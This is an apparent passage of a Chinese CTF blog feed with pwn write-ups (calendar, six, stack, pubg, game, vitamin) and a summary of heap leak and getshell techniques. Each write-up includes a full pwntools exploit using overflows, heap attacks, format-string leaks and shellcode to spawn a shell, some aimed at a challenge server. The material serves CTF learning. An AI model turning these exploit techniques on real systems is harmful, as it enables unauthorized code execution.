libc.symbols[&apos;puts&apos;]</span><br><span class="line">sh.recvuntil(&apos;occupation?\n&apos;)</span><br><span class="line">sh.send(&apos;a&apos; * 0xff)</span><br><span class="line">sh.recvuntil(&apos;[Y/N]\n&apos;)</span><br><span class="line">sh.sendline(&apos;Y&apos;)</span><br><span class="line">shellcode = &apos;a&apos; * 0x108 + p64(canary) + p64(0)</span><br><span class="line">shellcode += p64(0x0000000000401573) + p64(next(libc.search(&apos;/bin/sh&apos;)) + libc_addr) + p64(libc_addr + libc.symbols[&apos;system&apos;])</span><br><span class="line">sh.send(shellcode)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h1 id="calendar"><a href="#calendar" class="headerlink" title="calendar"></a>calendar</h1><h2 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h2><p>选项题 add edit delete ，但是没有show函数</p><p>add 最多可以控制四个chunk，申请最大size为0x68</p><p>edit 可以输入新的size，只有在新的size小于等于原先输入的size时，可以输入内容</p><p>delete 只有free，存在UAF</p><p>程序在输入字符串时的get_str函数存在off-by-one漏洞</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for ( i = 0; (signed int)i &lt;= len; ++i )      // off by one</span><br></pre></td></tr></table></figure><p>题目提示house of roman</p><h2 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h2><p>刚开始看到没有show 函数，感觉就有点无从下手，根据house of roman的提示，去看一下这种利用方法，确实是基于没有show功能的情况下的利用方法，拿这个题顺便学习一下。</p><p>查看保护,全开（丧心病狂）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure></p><p>本地关闭随机化进行调试，调试成功后进行爆破就行了(玄学爆破，getshell要看命)</p><p>house of roman 利用 局部写 减少随机化的程度，从而给出爆破的可能<br>其相当于结合了fastbin attack 与 unsortedbin attack ，在没有泄露函数地址的情况下，利用unsortedbin 的首chunk的fd bk指向main_arena+88，也就是在malloc_hook附近。</p><p><em>ps: 如果是 64 位程序，通过malloc_printerr 触发 malloc ，基本可以稳定 getshell .</em></p><h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">#context.log_level=&apos;debug&apos;</span><br><span class="line"></span><br><span class="line">#sh=process(&apos;./task_calendar&apos;)</span><br><span class="line"></span><br><span class="line">def add(idx,size):</span><br><span class="line">sh.sendlineafter(&apos;&gt;&apos;,&apos;1&apos;)</span><br><span class="line">sh.sendlineafter(&apos;&gt;&apos;,str(idx))</span><br><span class="line">sh.sendlineafter(&apos;&gt;&apos;,str(size))</span><br><span class="line"></span><br><span class="line">def edit(idx,size,info):</span><br><span class="line">sh.sendlineafter(&apos;&gt;&apos;,&apos;2&apos;)</span><br><span class="line">sh.sendlineafter(&apos;&gt;&apos;,str(idx))</span><br><span class="line">sh.sendlineafter(&apos;&gt;&apos;,str(size))</span><br><span class="line">sh.sendafter(&apos;&gt;&apos;,info)</span><br><span class="line"></span><br><span class="line">def dele(idx):</span><br><span class="line">sh.sendlineafter(&apos;&gt;&apos;,&apos;3&apos;)</span><br><span class="line">sh.sendlineafter(&apos;&gt;&apos;,str(idx))</span><br><span class="line"></span><br><span class="line">def exp():</span><br><span class="line">sh.recvuntil(&apos;input calendar name&gt; &apos;)</span><br><span class="line">sh.sendline(&apos;name&apos;)</span><br><span class="line"></span><br><span class="line">add(1,0x68)</span><br><span class="line">add(2,0x68)</span><br><span class="line">add(3,0x68)</span><br><span class="line"></span><br><span class="line">#------make chunk2 free to unsorted bin----------</span><br><span class="line"></span><br><span class="line">edit(3,0x68,p64(0)*2+p64(0x90)+p64(0x51)+&apos;\n&apos;)</span><br><span class="line">edit(1,0x68,&apos;a&apos;*0x68+&apos;\x91&apos;)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">dele(2)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">#----fastbin attack-----------------------------</span><br><span class="line"></span><br><span class="line">edit(1,0x68,&apos;a&apos;*0x68+&apos;\x71&apos;)</span><br><span class="line">dele(1)</span><br><span class="line">dele(3)</span><br><span class="line">edit(3,1,&apos;\x70\x70&apos;)</span><br><span class="line">edit(2,1,&apos;\xfd\x1a&apos;)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">#--fastbin[0x70]= chunk3-&gt; chunk2 -&gt;malloc_hook-13-----</span><br><span class="line">add(1,0x60)</span><br><span class="line">add(4,0x60)</span><br><span class="line">add(3,0x60)</span><br><span class="line"></span><br><span class="line"># fix fastbinY---------</span><br><span class="line">dele(4)</span><br><span class="line">edit(4,7,p64(0))</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">#----unsorted bin attack-------------------------</span><br><span class="line"></span><br><span class="line">add(1,0x60)</span><br><span class="line">edit(1,9,p64(0)+&apos;\x00\x1b&apos;)</span><br><span class="line">add(1,0x60)</span><br><span class="line"></span><br><span class="line">#----edit malloc_hook to one_gadget--------------</span><br><span class="line"></span><br><span class="line">one_off = 0xf66f0</span><br><span class="line">edit(3,5,&apos;aaa\xa4\xd2\xaf&apos;)</span><br><span class="line"></span><br><span class="line">dele(4)</span><br><span class="line">dele(4)</span><br><span class="line"></span><br><span class="line">for i in range(10000):</span><br><span class="line">sh = process(&apos;./task_calendar&apos;)</span><br><span class="line">try:</span><br><span class="line">exp()</span><br><span class="line"></span><br><span class="line">break;</span><br><span class="line">except:</span><br><span class="line">print i</span><br><span class="line">sh.close()</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h1 id="six"><a href="#six" class="headerlink" title="six"></a>six</h1><h2 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h2><p>一道感觉很奇怪的题目，不容易看懂</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall main(__int64 a1, char **a2, char **a3)</span><br><span class="line">&#123;</span><br><span class="line">  void (__fastcall *v3)(__int64, char *); // ST08_8</span><br><span class="line">  size_t v4; // rax</span><br><span class="line">  char *v5; // rbx</span><br><span class="line">  size_t v6; // rax</span><br><span class="line">  char s; // [rsp+10h] [rbp-20h]</span><br><span class="line">  unsigned __int64 v9; // [rsp+18h] [rbp-18h]</span><br><span class="line"></span><br><span class="line">  v9 = __readfsqword(0x28u);</span><br><span class="line">  mmap2chunk();</span><br><span class="line">  </span><br><span class="line">  `</span><br><span class="line">  fd = open(&quot;/dev/urandom&quot;, 0);</span><br><span class="line">  read(fd, &amp;buf, 6uLL);</span><br><span class="line">  read(fd, &amp;v3, 6uLL);</span><br><span class="line">  dest = mmap((void *)(v3 &amp; 0xFFFFFFFFFFFFF000LL), 0x1000uLL, 7, 34, -1, 0LL);       --》rwx 高地址</span><br><span class="line">  qword_202098 = (__int64)mmap((void *)(buf &amp; 0xFFFFFFFFFFFFF000LL), 0x1000uLL, 3, 34, -1, 0LL) + 0x500;    --》rw  低地址</span><br><span class="line">  `</span><br><span class="line"></span><br><span class="line">  v3 = (void (__fastcall *)(__int64, char *))dest;</span><br><span class="line">  memset(&amp;s, 0, 8uLL);</span><br><span class="line">  puts(&quot;Show Ne0 your shellcode:&quot;);</span><br><span class="line">  read(0, &amp;s, 6uLL);</span><br><span class="line">  judge_shellcode((__int64)&amp;s);</span><br><span class="line">  v4 = strlen(src);</span><br><span class="line">  memcpy(dest, src, v4);</span><br><span class="line">  v5 = (char *)dest;</span><br><span class="line">  v6 = strlen(src);</span><br><span class="line">  memcpy(&amp;v5[v6], &amp;s, 7uLL);</span><br><span class="line">  v3(qword_202098, &amp;s);</span><br><span class="line">  return 0LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>程序刚开始mmap了两个地址，之后要求读入6个字节的shellcode，进入judge_shellcode进行判断，需要六个字节各不相同<br>最后会将src代码复制到第一个chunk 并执行其中的代码</p><h2 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h2><p>思路就是六个字节通过系统调用read函数，同时将rsi设置为rsp，即之后输入到栈顶，溢出到第一个chunk(即高地址的chunk)，将shellcode写入即可<br>(大概思路应该是这样，但是题目本身理解的还不是特别清楚，后面还得再看)</p><h2 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh = process(&apos;./six&apos;)</span><br><span class="line"></span><br><span class="line">context.arch = &apos;amd64&apos;</span><br><span class="line">sc=&apos;&apos;&apos;push rsp;pop rsi;lahf;xchg edx,eax;syscall&apos;&apos;&apos;</span><br><span class="line">sc = asm(sc)</span><br><span class="line">sh.sendafter(&apos;:&apos;,sc)</span><br><span class="line"></span><br><span class="line">pay = &apos;a&apos;*(0x1000-0x500)</span><br><span class="line">pay+=&apos;\x90&apos;*0x36+asm(shellcraft.sh())</span><br><span class="line">sh.sendline(pay)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;huwang&quot;&gt;&lt;a href=&quot;#huwang&quot; class=&quot;headerlink&quot; title=&quot;huwang&quot;&gt;&lt;/a&gt;huwang&lt;/h1&gt;&lt;h2 id=&quot;题目&quot;&gt;&lt;a href=&quot;#题目&quot; class=&quot;headerlink&quot; title=&quot;题目&quot;&gt;&lt;
      
    
    </summary>
    
      <category term="pwn" scheme="http://siriuswhiter.tk/categories/pwn/"/>
    
    
      <category term="pwn" scheme="http://siriuswhiter.tk/tags/pwn/"/>
    
      <category term="stack" scheme="http://siriuswhiter.tk/tags/stack/"/>
    
      <category term="heap" scheme="http://siriuswhiter.tk/tags/heap/"/>
    
  </entry>
  
  <entry>
    <title>Pwn Heap leak addr &amp;&amp; getshell</title>
    <link href="http://siriuswhiter.tk/2019/02/14/pwn-heap-leak-addr-getshell/"/>
    <id>http://siriuswhiter.tk/2019/02/14/pwn-heap-leak-addr-getshell/</id>
    <published>2019-02-14T05:37:18.000Z</published>
    <updated>2019-02-14T06:09:12.063Z</updated>
    
    <content type="html"><![CDATA[<p><em>在堆相关的题中经常需要泄露地址及最后的getshell，总结一下比较常用的方法：</em></p><h1 id="Leak-Address"><a href="#Leak-Address" class="headerlink" title="Leak Address"></a>Leak Address</h1><h2 id="heap-base"><a href="#heap-base" class="headerlink" title="heap base"></a>heap base</h2><ol><li>最常用的即在存在UAF或溢出之类的条件下，因为fastbin 在内存中为单链存放，之后释放的fastbin范围的chunk的fd指针会指向之前释放的等大小范围的chunk，泄露fd指针即可得到heap base</li><li>main arena中存放着top chunk的地址，如果有条件泄露其地址便可以得到heap base</li></ol><h2 id="libc-base"><a href="#libc-base" class="headerlink" title="libc base"></a>libc base</h2><ol><li>unsorted bin为双向链表，而第一个unsorted bin的fd 与 bk指针都指向main_arena+88 处，泄露指针处即可计算得到libc base</li></ol><h2 id="stack-addr"><a href="#stack-addr" class="headerlink" title="stack addr"></a>stack addr</h2><ol><li>一般在可以得到libc base的情况下，可以利用libc中存放的_environ指针，该指针指向栈中环境变量的位置，泄露该指针的值便可以得到栈地址</li></ol><h1 id="Get-Shell"><a href="#Get-Shell" class="headerlink" title="Get Shell"></a>Get Shell</h1><h2 id="write-to-plt-got"><a href="#write-to-plt-got" class="headerlink" title="write to .plt.got"></a>write to .plt.got</h2><p>当程序保护中got表不满时 即 ： RELRO: Partial RELRO 。此时got表可写，可以将某个函数的got地址改写为system()函数的地址，然后想办法将’/bin/sh’传参进去，get shell</p><h2 id="write-to-malloc-hook-or-free-hook"><a href="#write-to-malloc-hook-or-free-hook" class="headerlink" title="write to malloc_hook or free_hook"></a>write to malloc_hook or free_hook</h2><p>malloc_hook &amp;&amp; free_hook 是程序在调用malloc或free时会首先检查的地方，如果不为空，会先执行其指针指向的地方，所以如果将one_gadget或system(‘/bin/sh’)的地址写向该地址，便可以 get shell</p><h2 id="write-to-stack"><a href="#write-to-stack" class="headerlink" title="write to stack"></a>write to stack</h2><p>一般来说，这个真的是没有办法的话才用，利用上面的方法得到栈地址后，利用漏洞将one_gadget或system(‘/bin/sh’)的地址写向返回地址，这样程序在退出时便会getshell</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;em&gt;在堆相关的题中经常需要泄露地址及最后的getshell，总结一下比较常用的方法：&lt;/em&gt;&lt;/p&gt;
&lt;h1 id=&quot;Leak-Address&quot;&gt;&lt;a href=&quot;#Leak-Address&quot; class=&quot;headerlink&quot; title=&quot;Leak Addres
      
    
    </summary>
    
      <category term="pwn" scheme="http://siriuswhiter.tk/categories/pwn/"/>
    
    
      <category term="pwn" scheme="http://siriuswhiter.tk/tags/pwn/"/>
    
      <category term="heap" scheme="http://siriuswhiter.tk/tags/heap/"/>
    
  </entry>
  
  <entry>
    <title>l3c-sec Pwn Recruit New Questions</title>
    <link href="http://siriuswhiter.tk/2019/02/12/l3c-sec-pwn-recruit-new-questions/"/>
    <id>http://siriuswhiter.tk/2019/02/12/l3c-sec-pwn-recruit-new-questions/</id>
    <published>2019-02-12T11:52:35.000Z</published>
    <updated>2019-02-26T14:16:45.751Z</updated>
    
    <content type="html"><![CDATA[<p><em>华科一个新战队的招新题，正好最近没有兴致继续下去，来玩一玩招新题</em></p><h1 id="stack"><a href="#stack" class="headerlink" title="stack"></a>stack</h1><p>最简单的栈溢出</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">#sh = process(&apos;./stack&apos;)</span><br><span class="line">sh =remote(&apos;159.65.68.241&apos;,&apos;10003&apos;)</span><br><span class="line">sys_addr = 0x80491e2</span><br><span class="line"></span><br><span class="line">pay = &apos;a&apos;*0x3a +&apos;bbbb&apos;+p32(sys_addr)</span><br><span class="line"></span><br><span class="line">sh.sendline(pay)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h1 id="pubg"><a href="#pubg" class="headerlink" title="pubg"></a>pubg</h1><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>先是一大段将随机值写入key.txt然后读出等等，然后将输入的值与读出的值进行比较，相等则进入overflow函数，栈溢出getshell就行。</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>前面一大段其实是可以不用管的<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">int __fastcall sub_401DDC(int time, void *ptr)</span><br><span class="line">&#123;</span><br><span class="line">  char s; // [rsp+10h] [rbp-50h]</span><br><span class="line">  FILE *stream; // [rsp+50h] [rbp-10h]</span><br><span class="line">  unsigned int i; // [rsp+5Ch] [rbp-4h]</span><br><span class="line"></span><br><span class="line">  stream = fopen(&quot;./key.txt&quot;, &quot;w&quot;);</span><br><span class="line">  for ( i = 0; time + 1 &gt; i; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    memset(&amp;s, 0, 0x40uLL);</span><br><span class="line">    sub_401B55((__int64)ptr, (__int64)&amp;s, 0x10u);</span><br><span class="line">    memset(ptr, 0, 0x40uLL);</span><br><span class="line">    strcpy((char *)ptr, &amp;s);</span><br><span class="line">  &#125;</span><br><span class="line">  fwrite(ptr, 0x20uLL, 1uLL, stream);           // s --&gt; file</span><br><span class="line">  return fclose(stream);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>在这一段里可以发现如果输入的time=-1，那么整个写入的循环便会被跳过，随后输入空值便可以进入overflow函数，溢出getshell</p><p>需要注意的是前面需要先写入一次使得key.txt创建，如果文件已经创建的话其实就可以不用了。</p><h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level=&apos;debug&apos;</span><br><span class="line">#p=process(&apos;./pubg&apos;)</span><br><span class="line">p=remote(&apos;159.65.68.241&apos;,9001)</span><br><span class="line">p.recvuntil(&apos;code&apos;)</span><br><span class="line">p.sendline(&apos;2&apos;)</span><br><span class="line">p.recvuntil(&apos;:&apos;)</span><br><span class="line">p.sendline(&apos;-2&apos;)</span><br><span class="line">time.sleep(5)</span><br><span class="line">p.close()</span><br><span class="line"></span><br><span class="line">#p=process(&apos;./pubg&apos;)</span><br><span class="line">p=remote(&apos;159.65.68.241&apos;,9001)</span><br><span class="line">p.recvuntil(&apos;code&apos;)</span><br><span class="line">p.sendline(&apos;2&apos;)</span><br><span class="line">p.recvuntil(&apos;:&apos;)</span><br><span class="line">p.sendline(&apos;-1&apos;)</span><br><span class="line">p.recvuntil(&apos;:&apos;)</span><br><span class="line">p.send(&apos;\x00&apos;*16)</span><br><span class="line">p.recvuntil(&apos;:&apos;)</span><br><span class="line">p.send(&apos;A&apos;*0x28+p64(0x401BED))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="game"><a href="#game" class="headerlink" title="game"></a>game</h1><h2 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">unsigned int Game()</span><br><span class="line">&#123;</span><br><span class="line">  unsigned int v0; // eax</span><br><span class="line">  unsigned int v1; // eax</span><br><span class="line">  char s; // [esp+Ch] [ebp-10Ch]</span><br><span class="line">  char v4; // [esp+106h] [ebp-12h]</span><br><span class="line">  char v5; // [esp+107h] [ebp-11h]</span><br><span class="line">  char v6; // [esp+108h] [ebp-10h]</span><br><span class="line">  char v7; // [esp+109h] [ebp-Fh]</span><br><span class="line">  char v8; // [esp+10Ah] [ebp-Eh]</span><br><span class="line">  unsigned int v9; // [esp+10Ch] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  v9 = __readgsdword(0x14u);</span><br><span class="line">  memset(&amp;s, 0, 0x100u);</span><br><span class="line">  v0 = time(0);</span><br><span class="line">  srand(v0);</span><br><span class="line">  v4 = rand();</span><br><span class="line">  v5 = rand();</span><br><span class="line">  v6 = rand();</span><br><span class="line">  v7 = rand();</span><br><span class="line">  v8 = 0;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  puts(&quot;What&apos;s your magic string?&quot;);</span><br><span class="line">  gets(&amp;s);</span><br><span class="line">  v1 = Hash(&amp;s);</span><br><span class="line">  if ( v1 == *(_DWORD *)&amp;v4 )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;Congraz!! Your magic string is:&quot;);</span><br><span class="line">    printf(&amp;s);                                 // fmt</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;Wrong!&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  return __readgsdword(0x14u) ^ v9;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h2><p>有个明显的栈溢出与fmt漏洞，一共三次机会<br>思路便是输入格式化字符串并使用\x00截断，同时溢出至v4，因为hash中的算法已知且其使用strlen，因此可以利用其将输入的\x00之前的字符串的hash计算出来，并将其写入v4，这样通过检查，利用fmt漏洞分别泄露canary 与libc基址，最后一次覆盖栈返回地址为已给的hacker函数即可</p><h2 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.terminal=[&apos;bash&apos;]</span><br><span class="line">#context.log_level=&apos;debug&apos;</span><br><span class="line">#p=process(&apos;./game&apos;)</span><br><span class="line">p=remote(&apos;159.65.68.241&apos;,10002)</span><br><span class="line">p.recvuntil(&apos;?&apos;)</span><br><span class="line">p.sendline(&apos;%71$p&apos;.ljust(250,b&apos;\x00&apos;)+p32(0x365))</span><br><span class="line">p.recvuntil(&apos;:\n&apos;)</span><br><span class="line">canary=p.recvuntil(&apos;W&apos;)[:-1]</span><br><span class="line">print(&apos;canary is &apos;+ canary)</span><br><span class="line">#gdb.attach(p)</span><br><span class="line">#pause()</span><br><span class="line">p.sendline(&apos;%3$p&apos;.ljust(250,&apos;\x00&apos;)+p32(0x19))</span><br><span class="line">p.recvuntil(&apos;:\n&apos;)</span><br><span class="line">base=p.recvuntil(&apos;W&apos;)[:-1]</span><br><span class="line">print(&apos;base is &apos;+ base)</span><br><span class="line">p.sendline(&apos;\x00&apos;*0x100+p32(int(canary,16))+&apos;A&apos;*12+p32(int(base[:-3]+&apos;2f5&apos;,16)))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="vitamin"><a href="#vitamin" class="headerlink" title="vitamin"></a>vitamin</h1><h2 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h2><p>简单的堆，基本上没有检查</p><h2 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h2><p>UAF将堆分配到bss段改buf指针指向got表，修改got表某个函数即可</p><p>(前面傻逼了好久，忘了开始的fork，调试attach不上进程，懵逼了好久)</p><h2 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">from pwn import * </span><br><span class="line">context.log_level=&apos;debug&apos; </span><br><span class="line">p=process(&apos;./vitamin&apos;) </span><br><span class="line">#p=remote(&apos;159.65.68.241&apos;, 10001) </span><br><span class="line"></span><br><span class="line">def debug(addr = &apos;0x400BC7&apos;):     </span><br><span class="line">  gdb.attach(proc.pidof(p)[0]+1, &quot;b *&quot; + addr)     </span><br><span class="line">  raw_input(&apos;debug:&apos;) </span><br><span class="line"></span><br><span class="line">def create(formula):     </span><br><span class="line">  p.recvuntil(&apos;:\n&apos;)     </span><br><span class="line">  p.sendline(&apos;1&apos;)     </span><br><span class="line">  p.recvuntil(&apos;:\n&apos;)     </span><br><span class="line">  p.sendline(formula) </span><br><span class="line"> </span><br><span class="line">def change(formula):     </span><br><span class="line">  p.recvuntil(&apos;:\n&apos;)     </span><br><span class="line">  p.sendline(&apos;3&apos;)     </span><br><span class="line">  p.recvuntil(&apos;:\n&apos;)     </span><br><span class="line">  p.sendline(formula) </span><br><span class="line"> </span><br><span class="line">def take():     </span><br><span class="line">  p.recvuntil(&apos;:\n&apos;)     </span><br><span class="line">  p.sendline(&apos;2&apos;) #debug() </span><br><span class="line"> </span><br><span class="line">free_got=0x602018 </span><br><span class="line">create(&apos;aaaa&apos;) </span><br><span class="line">take() </span><br><span class="line">change(p64(0x6020dd)) </span><br><span class="line">create(p64(0x6020dd)) </span><br><span class="line">create(&apos;A&apos;*11+p64(free_got)) </span><br><span class="line">change(p64(0x400d58)) </span><br><span class="line">p.sendline(&apos;2&apos;) </span><br><span class="line">take()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="store"><a href="#store" class="headerlink" title="store"></a>store</h1><h2 id="题目-3"><a href="#题目-3" class="headerlink" title="题目"></a>题目</h2><p>选项题，功能有add,read,sell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 